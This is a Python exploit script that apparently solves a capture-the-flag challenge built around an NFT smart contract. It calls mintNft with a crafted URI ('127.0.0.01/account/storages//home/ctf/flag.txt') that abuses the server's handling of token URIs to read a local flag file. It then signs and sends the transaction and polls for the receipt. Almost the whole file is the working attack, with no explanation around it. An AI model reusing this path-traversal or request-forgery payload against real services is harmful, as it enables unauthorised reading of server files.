import json
import time

from account import *
from web3 import Web3


url = "http://13.124.97.208:8545"
provider = Web3(Web3.HTTPProvider(url))

with open("abi.json") as f:
    nft_abi = json.load(f)

nft = provider.eth.contract(TARGET_ADDRESS, abi=nft_abi)

transaction = nft.functions.mintNft(
    "127.0.0.01/account/storages//home/ctf/flag.txt"
).buildTransaction(
    {
        "gas": 1000000,
        "gasPrice": Web3.toWei(1000, "gwei"),
        "nonce": provider.eth.get_transaction_count(SENDER_ADDRESS),
    }
)

print(transaction)

signed_tx = provider.eth.account.sign_transaction(transaction, SENDER_PRIVATE_KEY)
print(signed_tx)

tx_hash = provider.eth.send_raw_transaction(signed_tx.rawTransaction)

while True:
    try:
        print(provider.eth.get_transaction_receipt(tx_hash))
        break
    except Exception as e:
        if "not found" in str(e):
            print("not found")
        else:
            raise e
    time.sleep(3)
